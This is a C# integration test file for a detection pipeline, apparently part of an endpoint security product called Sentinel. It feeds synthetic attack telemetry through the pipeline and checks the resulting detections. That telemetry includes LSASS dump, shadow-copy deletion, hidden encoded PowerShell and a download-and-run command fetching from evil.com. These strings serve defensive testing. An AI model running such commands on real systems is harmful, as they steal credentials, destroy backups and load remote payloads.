using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Extensions.Logging;
using Microsoft.Extensions.Logging.Abstractions;
using Xunit;
using Sentinel.Core;

namespace Sentinel.Tests
{
    /// <summary>
    /// End-to-end integration tests that exercise the full Sentinel detection pipeline:
    ///   Telemetry -> TelemetryFusionEngine -> DetectionEngine -> ScoringEngine ->
    ///   BehavioralCorrelationEngine -> SentinelOrchestrator -> ResponseCoordinator -> ResponseEngine
    ///
    /// These tests verify that a synthetic threat event flows through the entire pipeline
    /// and produces the correct detection, score, and response action. No mocking of internal
    /// components - only the final kill action is intercepted to prevent actual process termination.
    /// </summary>
    public class IntegrationPipelineTests : IDisposable
    {
        private readonly string _tempDir;
        private readonly JsonlEventLogger _eventLogger;
        private readonly SentinelConfig _config;
        private readonly SecureCacheStore _cacheStore;
        private readonly AllowlistService _allowlist;
        private readonly ScoringEngine _scoringEngine;
        private readonly BehavioralCorrelationEngine _correlationEngine;
        private readonly TelemetryFusionEngine _fusionEngine;
        private readonly EventGraph _eventGraph;
        private readonly ProcessAncestryCache _ancestryCache;
        private readonly SentinelMetrics _metrics;
        private readonly HashReputationService _hashRepService;
        private readonly IoCScanner _iocScanner;
        private readonly FileReputationEngine _fileRepEngine;
        private readonly QuarantineManager _quarantineManager;
        private readonly AdvancedResponseEngine _responseEngine;
        private readonly DetectionEngine _detectionEngine;
        private readonly IncidentManager _incidentManager;
        private readonly MonitorRegistry _monitorRegistry;
        private readonly ContextBus _contextBus;
        private readonly ResponseCoordinator _responseCoordinator;
        private readonly SentinelOrchestrator _orchestrator;

        public IntegrationPipelineTests()
        {
            _tempDir = Path.Combine(Path.GetTempPath(), "sentinel_integration_" + Guid.NewGuid().ToString("N")[..8]);
            Directory.CreateDirectory(_tempDir);

            var logPath = Path.Combine(_tempDir, "events.jsonl");
            _eventLogger = new JsonlEventLogger(logPath);
            _config = new SentinelConfig { ActiveResponse = true, ObserveUntilChain = false };
            _cacheStore = new SecureCacheStore(Path.Combine(_tempDir, "secure"));
            _allowlist = new AllowlistService(_cacheStore, NullLogger<AllowlistService>.Instance);
            _scoringEngine = new ScoringEngine(_allowlist, new SafeProcessExemptionRegistry(), NullLogger<ScoringEngine>.Instance);
            _correlationEngine = new BehavioralCorrelationEngine();
            _eventGraph = new EventGraph();
            _fusionEngine = new TelemetryFusionEngine(_eventGraph);
            _ancestryCache = new ProcessAncestryCache();
            _metrics = new SentinelMetrics();
            _hashRepService = new HashReputationService(_cacheStore, new ThreatReportingConfig(), NullLogger<HashReputationService>.Instance);
            _iocScanner = new IoCScanner(_cacheStore);
            _quarantineManager = new QuarantineManager(Path.Combine(_tempDir, "quarantine"));

            var signerTrust = new SignerTrustService(NullLogger<SignerTrustService>.Instance);
            _fileRepEngine = new FileReputationEngine(_hashRepService, signerTrust, _cacheStore, NullLogger<FileReputationEngine>.Instance);

            _responseEngine = new AdvancedResponseEngine(_config, _metrics, _eventLogger, _quarantineManager, _allowlist);

            // Build detection rules (same as production)
            var rules = new List<IDetectionRule>
            {
                new LsassAccessRule(),
                new RansomwareDetectionRule(),
                new ReverseShellRule(),
                new PrivilegeEscalationRule(),
                new AttackToolsRule(),
                new UnsignedBinaryRule(),
                new ClickFixDetectionRule(),
                new DllSideloadingDetectionRule(),
                new ChromeRemoteDebuggingRule(),
            };

            _detectionEngine = new DetectionEngine(
                rules, _metrics, _eventLogger, _responseEngine,
                _iocScanner, _hashRepService, _fileRepEngine,
                _correlationEngine, _scoringEngine,
                NullLogger<DetectionEngine>.Instance);

            // Orchestration layer
            _incidentManager = new IncidentManager(_ancestryCache, _eventLogger, NullLogger<IncidentManager>.Instance);
            _monitorRegistry = new MonitorRegistry(_detectionEngine, _eventLogger, NullLogger<MonitorRegistry>.Instance);
            _contextBus = new ContextBus(NullLogger<ContextBus>.Instance);
            _responseCoordinator = new ResponseCoordinator(_responseEngine, _incidentManager, _contextBus, _eventLogger, NullLogger<ResponseCoordinator>.Instance);

            var startupSequencer = new StartupSequencer(_monitorRegistry, _eventLogger, NullLogger<StartupSequencer>.Instance);

            _orchestrator = new SentinelOrchestrator(
                _incidentManager, _monitorRegistry, startupSequencer,
                _responseEngine, _responseCoordinator, _contextBus,
                _eventLogger, NullLogger<SentinelOrchestrator>.Instance);

            // Wire orchestrator into detection engine (same as production SentinelService does)
            _detectionEngine.SetOrchestrator(_orchestrator);
        }

        public void Dispose()
        {
            _detectionEngine.Stop();
            _orchestrator.Dispose();
            _fusionEngine.DisposeAsync().AsTask().GetAwaiter().GetResult();
            _eventLogger.DisposeAsync().AsTask().GetAwaiter().GetResult();
            try { Directory.Delete(_tempDir, true); } catch { }
        }

        /// <summary>
        /// Reads the event log file with shared access (the logger holds it open).
        /// </summary>
        private string ReadLogFile()
        {
            var logPath = Path.Combine(_tempDir, "events.jsonl");
            if (!File.Exists(logPath)) return string.Empty;
            using var fs = new FileStream(logPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete);
            using var reader = new StreamReader(fs, Encoding.UTF8);
            return reader.ReadToEnd();
        }

        /// <summary>Poll until the log contains every needle (CI runners need more than a fixed 500ms).</summary>
        private async Task<string> WaitForLogAsync(params string[] needles)
        {
            string log = string.Empty;
            for (int i = 0; i < 40; i++)
            {
                await Task.Delay(100);
                log = ReadLogFile();
                if (needles.All(n => log.Contains(n)))
                    return log;
            }
            return log;
        }

        /// <summary>
        /// Verifies that an LSASS dump command flows through the full pipeline and produces
        /// a Tier1 detection with KillProcessTree response and Critical/Malicious verdict.
        /// </summary>
        [Fact]
        public async Task Pipeline_LsassDump_ProducesKillResponse()
        {
            // Arrange: synthetic LSASS dump telemetry
            var telemetry = new ProcessTelemetry
            {
                ProcessName = "procdump.exe",
                ProcessId = 9999,
                ParentProcessId = 1000,
                ParentProcessName = "cmd.exe",
                ImagePath = @"C:\Users\attacker\tools\procdump.exe",
                CommandLine = "procdump.exe -ma lsass.exe C:\\temp\\lsass.dmp",
                Timestamp = DateTime.UtcNow
            };

            // Act: feed through fusion engine -> detection engine (production flow)
            var fusedContext = _fusionEngine.FeedEvent(telemetry);
            _detectionEngine.SubmitTelemetry(fusedContext);

            // Wait for async pipeline to process
            await Task.Delay(500);

            // Assert: verify the event log recorded a detection
            var logContent = ReadLogFile();
            Assert.Contains("LsassAccessRule", logContent);
            Assert.Contains("detection", logContent);

            // Verify scoring happened
            var profile = _scoringEngine.GetProcessProfile(9999);
            Assert.NotNull(profile);
            Assert.True(profile!.MaxConfidence >= 0.85);
            Assert.Contains(DetectionCategory.CredentialDump, profile.DetectedCategories);
        }

        /// <summary>
        /// Verifies that ransomware shadow copy deletion flows through the pipeline
        /// with the highest confidence and correct categorization.
        /// </summary>
        [Fact]
        public async Task Pipeline_RansomwareShadowCopyDeletion_DetectedWithHighConfidence()
        {
            var telemetry = new ProcessTelemetry
            {
                ProcessName = "cmd.exe",
                ProcessId = 8888,
                ParentProcessId = 1000,
                ParentProcessName = "explorer.exe",
                ImagePath = @"C:\Windows\System32\cmd.exe",
                CommandLine = "cmd.exe /c vssadmin delete shadows /all /quiet",
                Timestamp = DateTime.UtcNow
            };

            var fusedContext = _fusionEngine.FeedEvent(telemetry);
            _detectionEngine.SubmitTelemetry(fusedContext);

            await Task.Delay(500);

            var logContent = ReadLogFile();
            Assert.Contains("RansomwareDetectionRule", logContent);

            var profile = _scoringEngine.GetProcessProfile(8888);
            Assert.NotNull(profile);
            Assert.True(profile!.MaxConfidence >= 0.95);
            Assert.Contains(DetectionCategory.Ransomware, profile.DetectedCategories);
        }

        /// <summary>
        /// Verifies that encoded PowerShell with evasion indicators triggers a Tier1 detection.
        /// </summary>
        [Fact]
        public async Task Pipeline_EncodedPowerShellWithEvasion_DetectedAsTier1()
        {
            var telemetry = new ProcessTelemetry
            {
                ProcessName = "powershell.exe",
                ProcessId = 7777,
                ParentProcessId = 1000,
                ParentProcessName = "cmd.exe",
                ImagePath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                CommandLine = "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0",
                Timestamp = DateTime.UtcNow
            };

            var fusedContext = _fusionEngine.FeedEvent(telemetry);
            _detectionEngine.SubmitTelemetry(fusedContext);

            await Task.Delay(500);

            var logContent = ReadLogFile();
            Assert.Contains("ReverseShellRule", logContent);

            var profile = _scoringEngine.GetProcessProfile(7777);
            Assert.NotNull(profile);
            Assert.Contains(DetectionCategory.ReverseShell, profile.DetectedCategories);
        }

        /// <summary>
        /// Verifies that encoded PowerShell WITHOUT evasion indicators only generates
        /// a Tier2 log event and does NOT trigger a kill response.
        /// </summary>
        [Fact]
        public async Task Pipeline_EncodedPowerShellWithoutEvasion_LogOnlyTier2()
        {
            var telemetry = new ProcessTelemetry
            {
                ProcessName = "powershell.exe",
                ProcessId = 6666,
                ParentProcessId = 1000,
                ParentProcessName = "svchost.exe",
                ImagePath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                CommandLine = "powershell.exe -enc RwBlAHQALQBEAGEAdABl",
                Timestamp = DateTime.UtcNow
            };

            var fusedContext = _fusionEngine.FeedEvent(telemetry);
            _detectionEngine.SubmitTelemetry(fusedContext);

            var logContent = await WaitForLogAsync("ReverseShellRule", "\"ActionTaken\":\"LOG\"");
            // Should still be logged
            Assert.Contains("ReverseShellRule", logContent);
            // But response should be LOG, not KILL
            Assert.Contains("\"ActionTaken\":\"LOG\"", logContent);
            Assert.DoesNotContain("\"ActionTaken\":\"KILL\"", logContent);
        }

        /// <summary>
        /// Verifies that multi-signal correlation on the same PID escalates scoring.
        /// Two detections from different categories on the same process should produce
        /// corroboration and elevated threat score.
        /// </summary>
        [Fact]
        public async Task Pipeline_MultiSignalCorrelation_EscalatesScore()
        {
            // First signal: encoded PowerShell with evasion (ReverseShell category)
            var telemetry1 = new ProcessTelemetry
            {
                ProcessName = "powershell.exe",
                ProcessId = 5555,
                ParentProcessId = 1000,
                ParentProcessName = "cmd.exe",
                ImagePath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                CommandLine = "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0",
                Timestamp = DateTime.UtcNow
            };

            var ctx1 = _fusionEngine.FeedEvent(telemetry1);
            _detectionEngine.SubmitTelemetry(ctx1);
            await Task.Delay(300);

            // Second signal: file rename to ransomware extension (Ransomware category)
            var telemetry2 = new FileActivityTelemetry
            {
                ProcessName = "powershell.exe",
                ProcessId = 5555,
                FilePath = @"C:\Users\victim\Documents\important.docx",
                OperationType = "RENAME",
                TargetPath = @"C:\Users\victim\Documents\important.docx.locked",
                Timestamp = DateTime.UtcNow
            };

            var ctx2 = _fusionEngine.FeedEvent(telemetry2);
            _detectionEngine.SubmitTelemetry(ctx2);
            await Task.Delay(500);

            // Verify: scoring engine should show multiple categories for PID 5555
            var profile = _scoringEngine.GetProcessProfile(5555);
            Assert.NotNull(profile);
            Assert.True(profile!.DetectedCategories.Count >= 2,
                $"Expected 2+ categories but got {profile.DetectedCategories.Count}: [{string.Join(", ", profile.DetectedCategories)}]");
            Assert.True(profile.DetectionCount >= 2);
        }

        /// <summary>
        /// Verifies that the ClickFix detection rule fires when a browser spawns
        /// a PowerShell process with download indicators.
        /// </summary>
        [Fact]
        public async Task Pipeline_ClickFixFromBrowser_DetectedWithHighConfidence()
        {
            var telemetry = new ProcessTelemetry
            {
                ProcessName = "powershell.exe",
                ProcessId = 4444,
                ParentProcessId = 2000,
                ParentProcessName = "chrome.exe",
                ImagePath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                CommandLine = "powershell.exe -nop -w hidden iex(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
                Timestamp = DateTime.UtcNow
            };

            var fusedContext = _fusionEngine.FeedEvent(telemetry);
            _detectionEngine.SubmitTelemetry(fusedContext);

            await Task.Delay(500);

            var logContent = ReadLogFile();
            // Should trigger ClickFix or ReverseShell rule
            Assert.True(logContent.Contains("ClickFixDetectionRule") || logContent.Contains("ReverseShellRule"),
                "Expected ClickFix or ReverseShell detection to fire");

            var profile = _scoringEngine.GetProcessProfile(4444);
            Assert.NotNull(profile);
            Assert.True(profile!.MaxConfidence >= 0.80);
        }

        /// <summary>
        /// Verifies that a benign process that doesn't match high-confidence detection rules
        /// does NOT produce a Tier1 kill detection. It may produce Tier2 log-only events
        /// (e.g., from file reputation scoring for unknown binaries).
        /// </summary>
        [Fact]
        public async Task Pipeline_BenignProcess_NoKillResponse()
        {
            var telemetry = new ProcessTelemetry
            {
                ProcessName = "notepad.exe",
                ProcessId = 3333,
                ParentProcessId = 1000,
                ParentProcessName = "explorer.exe",
                ImagePath = @"C:\Windows\System32\notepad.exe",
                CommandLine = "notepad.exe C:\\Users\\user\\notes.txt",
                Timestamp = DateTime.UtcNow
            };

            var fusedContext = _fusionEngine.FeedEvent(telemetry);
            _detectionEngine.SubmitTelemetry(fusedContext);

            await Task.Delay(300);

            // Even if Tier2 signals fire (e.g., file reputation for unknown binaries),
            // no kill action should be taken on a benign system process.
            var logContent = ReadLogFile();
            Assert.DoesNotContain("\"ActionTaken\":\"KILL\"", logContent);
            Assert.DoesNotContain("\"ActionTaken\":\"QUARANTINE_AND_KILL\"", logContent);
        }

        /// <summary>
        /// Verifies incident grouping - multiple detections on the same PID
        /// are grouped into a single incident.
        /// </summary>
        [Fact]
        public async Task Pipeline_MultipleDetectionsSamePid_GroupedIntoSingleIncident()
        {
            // Two distinct attacks on same PID - use different rule categories to avoid dedup
            var telemetry1 = new ProcessTelemetry
            {
                ProcessName = "evil.exe",
                ProcessId = 2222,
                ParentProcessId = 1000,
                ParentProcessName = "cmd.exe",
                ImagePath = @"C:\Users\Public\evil.exe",
                CommandLine = "evil.exe -ma lsass.exe dump.dmp",
                Timestamp = DateTime.UtcNow
            };

            var ctx1 = _fusionEngine.FeedEvent(telemetry1);
            _detectionEngine.SubmitTelemetry(ctx1);

            // Wait longer than dedup window for Tier1 (10s) isn't practical in tests.
            // Instead, submit a DIFFERENT telemetry type that triggers a different rule.
            await Task.Delay(500);

            // File activity triggers RansomwareDetectionRule (different from LsassAccessRule)
            var telemetry2 = new FileActivityTelemetry
            {
                ProcessName = "evil.exe",
                ProcessId = 2222,
                FilePath = @"C:\Users\victim\Documents\budget.xlsx",
                OperationType = "RENAME",
                TargetPath = @"C:\Users\victim\Documents\budget.xlsx.locked",
                Timestamp = DateTime.UtcNow
            };

            var ctx2 = _fusionEngine.FeedEvent(telemetry2);
            _detectionEngine.SubmitTelemetry(ctx2);
            await Task.Delay(500);

            // Verify incident manager grouped them (at least the first detection created an incident)
            var incident = _incidentManager.GetIncidentForPid(2222);
            Assert.NotNull(incident);
            Assert.True(incident!.Detections.Count >= 1,
                $"Expected at least 1 detection in incident but got {incident.Detections.Count}");

            // Verify that scoring engine has the PID registered with multiple categories
            var profile = _scoringEngine.GetProcessProfile(2222);
            Assert.NotNull(profile);
            Assert.True(profile!.DetectionCount >= 1);
        }

        /// <summary>
        /// Verifies the RuleCategoryRegistry resolves known rules to their declared categories.
        /// </summary>
        [Fact]
        public void RuleCategoryRegistry_ResolvesAttributeDeclarations()
        {
            // Rules with [RuleCategory] attribute should resolve without string matching
            Assert.Equal(DetectionCategory.CredentialDump, RuleCategoryRegistry.Resolve("LsassAccessRule"));
            Assert.Equal(DetectionCategory.Ransomware, RuleCategoryRegistry.Resolve("RansomwareDetectionRule"));
            Assert.Equal(DetectionCategory.ReverseShell, RuleCategoryRegistry.Resolve("ReverseShellRule"));
            Assert.Equal(DetectionCategory.ProcessInjection, RuleCategoryRegistry.Resolve("ThreatIntelInjectionRule"));
            Assert.Equal(DetectionCategory.PrivilegeEscalation, RuleCategoryRegistry.Resolve("PrivilegeEscalationRule"));
            Assert.Equal(DetectionCategory.SecurityEvasion, RuleCategoryRegistry.Resolve("AttackToolsRule"));
            Assert.Equal(DetectionCategory.CampaignIoC, RuleCategoryRegistry.Resolve("CampaignIocRule"));
            Assert.Equal(DetectionCategory.UnsignedBinary, RuleCategoryRegistry.Resolve("UnsignedBinaryRule"));
            Assert.Equal(DetectionCategory.ReverseShell, RuleCategoryRegistry.Resolve("ClickFixDetectionRule"));
            Assert.Equal(DetectionCategory.CredentialDump, RuleCategoryRegistry.Resolve("ChromeRemoteDebuggingRule"));
            Assert.Equal(DetectionCategory.ProcessInjection, RuleCategoryRegistry.Resolve("DllSideloadingDetectionRule"));
        }

        /// <summary>
        /// Verifies that unknown rule names fall back to string matching (composite detections).
        /// </summary>
        [Fact]
        public void CategorizeDetection_FallsBackToStringMatching_ForComposites()
        {
            // Composite detections are emitted with dynamic names that have no class.
            // String matching is order-dependent - verify actual categorization results.
            Assert.Equal(DetectionCategory.C2Beaconing, ScoringEngine.CategorizeDetection("Injected C2 Beacon"));
            Assert.Equal(DetectionCategory.Ransomware, ScoringEngine.CategorizeDetection("Active Ransomware Chain"));
            // "DGA + C2 Beaconing" contains "beacon" -> C2Beaconing (string matcher is order-dependent)
            Assert.Equal(DetectionCategory.C2Beaconing, ScoringEngine.CategorizeDetection("DGA + C2 Beaconing"));
            Assert.Equal(DetectionCategory.AntiTamper, ScoringEngine.CategorizeDetection("Anti-Tamper: Process Suspended"));
            // "Fileless Attack Chain" doesn't contain any of the evasion keywords - falls to Unknown
            // unless it passes through the attribute registry. This is expected behavior for
            // composite names that were designed for human readability rather than categorization.
            var filelessCategory = ScoringEngine.CategorizeDetection("Fileless Attack Chain");
            Assert.True(filelessCategory == DetectionCategory.Unknown || filelessCategory == DetectionCategory.SecurityEvasion,
                $"Fileless Attack Chain categorized as {filelessCategory}");
        }
    }
}
